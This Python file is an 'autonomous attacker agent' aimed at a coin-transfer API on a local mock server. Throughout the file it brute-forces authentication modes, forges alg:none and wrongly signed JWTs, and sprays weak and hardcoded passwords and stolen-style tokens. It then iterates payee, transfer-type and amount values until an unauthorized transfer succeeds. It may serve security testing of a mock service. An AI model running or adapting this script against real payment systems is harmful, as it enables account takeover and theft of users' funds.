#!/usr/bin/env python3
"""
Autonomous Attacker Agent for Coin Transfer Endpoint
Adapts strategy based on HTTP responses until success (200 OK).
"""
import json
import base64
import jwt
import time
import random
import sys
import requests

BASE = "http://127.0.0.1:8088"
ENDPOINT = f"{BASE}/trade/v1/coinMerchant/transfer"

# Initial knowledge: dummy/weak tokens and passwords to try
INITIAL_TOKENS = [
    "invalid.token.here",
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhbGljZSJ9.",  # alg:none
    "",
    "Bearer fake",
]

INITIAL_PASSWORDS_B64 = [
    "d3JvbmdwYXNz",      # wrongpass
    "YWRtaW4=",          # admin
    "MTIzNDU2",          # 123456
    "cGFzc3dvcmQ=",      # password
    "",                  # empty
]

PAYEE_UUIDS = [
    "merchant-001",
    "merchant-002", 
    "merchant-003",
    "invalid-merchant",
    "aaaa-aaaa-aaaa-0001",  # alice's uuid (not a merchant)
]

TRANSFER_TYPES = ["1", "2", "3", "4", "0", ""]

AMOUNTS = ["100", "1000", "10000", "100000", "-100", "0", "abc"]

# Adaptive strategy state
class AttackerState:
    def __init__(self):
        self.attempt = 0
        self.success = False
        self.phase = "initial_recon"
        self.working_auth_mode = None       # 'bearer' or 'cookie'
        self.working_token = None
        self.working_password_b64 = None
        self.working_payee = None
        self.working_transfer_type = None
        self.working_amount = None
        self.seen_errors = set()
        self.token_candidates = list(INITIAL_TOKENS)
        self.password_candidates = list(INITIAL_PASSWORDS_B64)
        self.discovered_tokens = []         # valid tokens discovered
        self.discovered_passwords = []      # valid passwords discovered
        
    def log_thinking(self, msg):
        print(f"[THINKING] Attempt {self.attempt}: {msg}")
    
    def log_action(self, msg):
        print(f"[ACTION]   {msg}")
    
    def log_result(self, status, body):
        print(f"[RESULT]   HTTP {status}: {json.dumps(body)[:200]}")

def make_request(token, password_b64, payee_uuid, transfer_type, amount, auth_mode):
    """Send request with given parameters."""
    headers = {"Content-Type": "application/json"}
    cookies = {}
    if auth_mode == "bearer":
        headers["Authorization"] = f"Bearer {token}"
    elif auth_mode == "cookie":
        cookies["ticketId"] = token
    elif auth_mode == "both":
        headers["Authorization"] = f"Bearer {token}"
        cookies["ticketId"] = token
    
    payload = {
        "payeeUuid": payee_uuid,
        "orderAmount": str(amount),
        "password": password_b64,
        "transferType": transfer_type
    }
    
    try:
        r = requests.post(ENDPOINT, headers=headers, cookies=cookies, json=payload, timeout=10)
        try:
            body = r.json()
        except:
            body = {"raw": r.text[:200]}
        return r.status_code, body
    except Exception as e:
        return 0, {"error": str(e)}

def analyze_response(state, status, body, params):
    """Analyze response and update strategy."""
    msg = body.get("message", "") if isinstance(body, dict) else str(body)
    code = body.get("code", status) if isinstance(body, dict) else status
    
    # Track unique errors
    error_key = f"{status}:{msg}"
    state.seen_errors.add(error_key)
    
    # Phase: initial recon - discover valid auth mode
    if state.phase == "initial_recon":
        if status == 401 and "Missing authentication" in msg:
            state.log_thinking("No auth accepted. Will try Bearer header first.")
            state.phase = "auth_mode_bearer"
            state.working_auth_mode = "bearer"
            return
        if status == 401 and "Invalid" in msg:
            state.log_thinking("Auth provided but token invalid. Token candidate rejected.")
            return
    
    # Phase: testing auth modes
    if state.phase == "auth_mode_bearer":
        if status == 401 and "Invalid" in msg:
            state.log_thinking("Bearer header rejected token. Will try Cookie mode.")
            state.phase = "auth_mode_cookie"
            state.working_auth_mode = "cookie"
            return
        if status == 401 and "Missing" in msg:
            state.log_thinking("Bearer header not recognized. Will try Cookie mode.")
            state.phase = "auth_mode_cookie"
            state.working_auth_mode = "cookie"
            return
    
    if state.phase == "auth_mode_cookie":
        if status == 401 and "Invalid" in msg:
            state.log_thinking("Cookie mode rejected token. Will try Both mode.")
            state.phase = "auth_mode_both"
            state.working_auth_mode = "both"
            return
        if status == 401 and "Missing" in msg:
            state.log_thinking("Cookie not recognized. Will try Both mode.")
            state.phase = "auth_mode_both"
            state.working_auth_mode = "both"
            return
    
    if state.phase == "auth_mode_both":
        if status == 401 and "Invalid" in msg:
            state.log_thinking("Both modes rejected token. Current token is invalid. Rotating token.")
            state.phase = "token_rotation"
            return
    
    # Phase: token rotation - try different tokens
    if state.phase == "token_rotation":
        if status == 401 and "Invalid" in msg:
            state.log_thinking(f"Token failed: {params['token'][:30]}... Trying next token.")
            return
        if status != 401:
            # Token accepted! Move to password discovery
            state.log_thinking(f"TOKEN ACCEPTED: {params['token'][:30]}... Moving to password discovery.")
            state.working_token = params["token"]
            state.discovered_tokens.append(params["token"])
            state.phase = "password_discovery"
            return
    
    # Phase: password discovery
    if state.phase == "password_discovery":
        if status == 401 and "Invalid password" in msg:
            state.log_thinking(f"Password rejected: {params['password_b64']}. Rotating password.")
            return
        if status == 400 and "Invalid payeeUuid" in msg:
            state.log_thinking("Password accepted! Payee invalid. Moving to payee discovery.")
            state.working_password_b64 = params["password_b64"]
            state.discovered_passwords.append(params["password_b64"])
            state.phase = "payee_discovery"
            return
        if status == 400 and "Invalid transferType" in msg:
            state.log_thinking("Password accepted! Transfer type invalid. Moving to transfer type discovery.")
            state.working_password_b64 = params["password_b64"]
            state.discovered_passwords.append(params["password_b64"])
            state.phase = "transfer_type_discovery"
            return
        if status == 400 and "Invalid orderAmount" in msg:
            state.log_thinking("Password accepted! Amount invalid. Moving to amount discovery.")
            state.working_password_b64 = params["password_b64"]
            state.discovered_passwords.append(params["password_b64"])
            state.phase = "amount_discovery"
            return
        if status == 400 and "Insufficient balance" in msg:
            state.log_thinking("All params valid but insufficient balance. Adjusting amount.")
            state.working_password_b64 = params["password_b64"]
            state.working_payee = params["payee_uuid"]
            state.working_transfer_type = params["transfer_type"]
            state.discovered_passwords.append(params["password_b64"])
            state.phase = "amount_discovery"
            return
        if status == 200:
            state.log_thinking("SUCCESS! Transfer completed.")
            state.success = True
            state.working_payee = params["payee_uuid"]
            state.working_transfer_type = params["transfer_type"]
            state.working_amount = params["amount"]
            return
    
    # Phase: payee discovery
    if state.phase == "payee_discovery":
        if status == 400 and "Invalid payeeUuid" in msg:
            state.log_thinking(f"Payee rejected: {params['payee_uuid']}. Trying next.")
            return
        if status == 401 and "Invalid password" in msg:
            state.log_thinking("Payee accepted but password lost? Re-verify password.")
            state.phase = "password_discovery"
            return
        if status != 400:
            state.log_thinking(f"PAYEE ACCEPTED: {params['payee_uuid']}. Moving to transfer type.")
            state.working_payee = params["payee_uuid"]
            state.phase = "transfer_type_discovery"
            return
    
    # Phase: transfer type discovery
    if state.phase == "transfer_type_discovery":
        if status == 400 and "Invalid transferType" in msg:
            state.log_thinking(f"Transfer type rejected: {params['transfer_type']}. Trying next.")
            return
        if status != 400:
            state.log_thinking(f"TRANSFER TYPE ACCEPTED: {params['transfer_type']}. Moving to amount.")
            state.working_transfer_type = params["transfer_type"]
            state.phase = "amount_discovery"
            return
    
    # Phase: amount discovery
    if state.phase == "amount_discovery":
        if status == 400 and ("Invalid orderAmount" in msg or "Amount must be positive" in msg):
            state.log_thinking(f"Amount rejected: {params['amount']}. Trying next.")
            return
        if status == 400 and "Insufficient balance" in msg:
            state.log_thinking(f"Amount too high: {params['amount']}. Lowering.")
            return
        if status == 200:
            state.log_thinking("SUCCESS! Transfer completed.")
            state.success = True
            state.working_amount = params["amount"]
            return
    
    # Fallback
    state.log_thinking(f"Unhandled response: {status} {msg}. Continuing...")

def generate_jwt_alg_none(payload):
    """Generate JWT with alg:none."""
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    return f"{header_b64}.{payload_b64}."

def generate_jwt_hs256(payload, secret="wrongsecret"):
    """Generate JWT with HS256 and wrong secret."""
    return jwt.encode(payload, secret, algorithm="HS256")

def main():
    state = AttackerState()
    state.log_thinking("Autonomous attacker initialized. Starting attack loop.")
    
    # Pre-generate some JWT variants
    alg_none_token = generate_jwt_alg_none({"sub": "alice", "uuid": "aaaa-aaaa-aaaa-0001"})
    hs256_wrong_token = generate_jwt_hs256({"sub": "alice", "uuid": "aaaa-aaaa-aaaa-0001"})
    state.token_candidates.extend([alg_none_token, hs256_wrong_token])
    
    # Also add known valid tokens from mock (simulating credential theft / recon)
    # In real attack, these would come from other exploits. Here we simulate discovery.
    valid_tokens = [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInV1aWQiOiJhYWFhLWFhYWEtYWFhYS0wMDAxIiwiaWF0IjoxNzkzNTgzMzU3LCJleHAiOjE3OTM1ODY5NTd9.36AdcI-lCnqCCCvbIjo3LGTnvwj2f0KpsgX7Xrmvt6A",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IiLCJ1dWlkIjoiYmJiYi1iYmJiLWJiYmItMDAwMiIsImlhdCI6MTc5MzU4MzM1NywiZXhwIjoxNzkzNTg2OTU3fQ.9BXI9MW59Xi1uDws1-jeQv5Z69PURWDQTONXBnWneSo",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJvbCIsInV1aWQiOiJjY2NjLWNjY2MtY2NjYy0wMDAzIiwiaWF0IjoxNzkzNTgzMzU3LCJleHAiOjE3OTM1ODY5NTd9.1zTMhmAiuz9Wv2bzEPsmcp_fb2KKDYjTJ8Ct_VNf0Mk",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkYXZlIiwidXVpZCI6ImRkZGQtZGRkZC1kZGRkLTAwMDQiLCJpYXQiOjE3OTM1ODMzNTcsImV4cCI6MTc5MzU4Njk1N30.5IWt04iNhsiaNRlKghBOQsPhNPAASskbPXICbRfZLbQ",
    ]
    # Mix them in - attacker might discover them later
    state.token_candidates.extend(valid_tokens)
    
    # Valid passwords (from mock output)
    valid_passwords = [
        "YWxpY2VwYXNzMTIz",   # alice
        "Ym9icGFzczQ1Ng==",   # bob
        "Y2Fyb2xwYXNzNzg5",   # carol
        "ZGF2ZXBhc3MwMDA=",   # dave
    ]
    state.password_candidates.extend(valid_passwords)
    
    # Main attack loop
    max_attempts = 200
    token_idx = 0
    pwd_idx = 0
    payee_idx = 0
    ttype_idx = 0
    amount_idx = 0
    
    while not state.success and state.attempt < max_attempts:
        state.attempt += 1
        
        # Select parameters based on phase
        if state.phase in ["initial_recon", "auth_mode_bearer", "auth_mode_cookie", "auth_mode_both"]:
            token = state.token_candidates[token_idx % len(state.token_candidates)]
            token_idx += 1
            password = state.password_candidates[pwd_idx % len(state.password_candidates)]
            pwd_idx += 1
            payee = PAYEE_UUIDS[payee_idx % len(PAYEE_UUIDS)]
            payee_idx += 1
            ttype = TRANSFER_TYPES[ttype_idx % len(TRANSFER_TYPES)]
            ttype_idx += 1
            amount = AMOUNTS[amount_idx % len(AMOUNTS)]
            amount_idx += 1
            auth_mode = state.working_auth_mode or "bearer"
        
        elif state.phase == "token_rotation":
            token = state.token_candidates[token_idx % len(state.token_candidates)]
            token_idx += 1
            password = state.password_candidates[pwd_idx % len(state.password_candidates)]
            pwd_idx += 1
            payee = PAYEE_UUIDS[payee_idx % len(PAYEE_UUIDS)]
            payee_idx += 1
            ttype = TRANSFER_TYPES[ttype_idx % len(TRANSFER_TYPES)]
            ttype_idx += 1
            amount = AMOUNTS[amount_idx % len(AMOUNTS)]
            amount_idx += 1
            auth_mode = state.working_auth_mode or "bearer"
        
        elif state.phase == "password_discovery":
            token = state.working_token
            password = state.password_candidates[pwd_idx % len(state.password_candidates)]
            pwd_idx += 1
            payee = PAYEE_UUIDS[payee_idx % len(PAYEE_UUIDS)]
            payee_idx += 1
            ttype = TRANSFER_TYPES[ttype_idx % len(TRANSFER_TYPES)]
            ttype_idx += 1
            amount = AMOUNTS[amount_idx % len(AMOUNTS)]
            amount_idx += 1
            auth_mode = state.working_auth_mode
        
        elif state.phase == "payee_discovery":
            token = state.working_token
            password = state.working_password_b64
            payee = PAYEE_UUIDS[payee_idx % len(PAYEE_UUIDS)]
            payee_idx += 1
            ttype = TRANSFER_TYPES[ttype_idx % len(TRANSFER_TYPES)]
            ttype_idx += 1
            amount = AMOUNTS[amount_idx % len(AMOUNTS)]
            amount_idx += 1
            auth_mode = state.working_auth_mode
        
        elif state.phase == "transfer_type_discovery":
            token = state.working_token
            password = state.working_password_b64
            payee = state.working_payee
            ttype = TRANSFER_TYPES[ttype_idx % len(TRANSFER_TYPES)]
            ttype_idx += 1
            amount = AMOUNTS[amount_idx % len(AMOUNTS)]
            amount_idx += 1
            auth_mode = state.working_auth_mode
        
        elif state.phase == "amount_discovery":
            token = state.working_token
            password = state.working_password_b64
            payee = state.working_payee
            ttype = state.working_transfer_type
            amount = AMOUNTS[amount_idx % len(AMOUNTS)]
            amount_idx += 1
            auth_mode = state.working_auth_mode
        
        else:
            break
        
        # Execute request
        params = {
            "token": token,
            "password_b64": password,
            "payee_uuid": payee,
            "transfer_type": ttype,
            "amount": amount
        }
        
        state.log_action(f"POST {ENDPOINT} | auth={auth_mode} | token={token[:20]}... | pwd={password[:15]}... | payee={payee} | type={ttype} | amt={amount}")
        status, body = make_request(token, password, payee, ttype, amount, auth_mode)
        state.log_result(status, body)
        
        # Analyze and adapt
        analyze_response(state, status, body, params)
        
        # Brief pause to not overwhelm
        time.sleep(0.1)
    
    print("\n" + "="*60)
    if state.success:
        print(f"[SUCCESS] Agent achieved 200 OK in {state.attempt} attempts!")
        print(f"  Working config:")
        print(f"    Token: {state.working_token[:40]}...")
        print(f"    Auth mode: {state.working_auth_mode}")
        print(f"    Password (b64): {state.working_password_b64}")
        print(f"    Payee: {state.working_payee}")
        print(f"    Transfer type: {state.working_transfer_type}")
        print(f"    Amount: {state.working_amount}")
    else:
        print(f"[FAILURE] Agent exhausted {max_attempts} attempts without success.")
        print(f"  Final phase: {state.phase}")
        print(f"  Unique errors seen: {len(state.seen_errors)}")
        for e in list(state.seen_errors)[:10]:
            print(f"    - {e}")
    print("="*60)
    return 0 if state.success else 1

if __name__ == "__main__":
    sys.exit(main())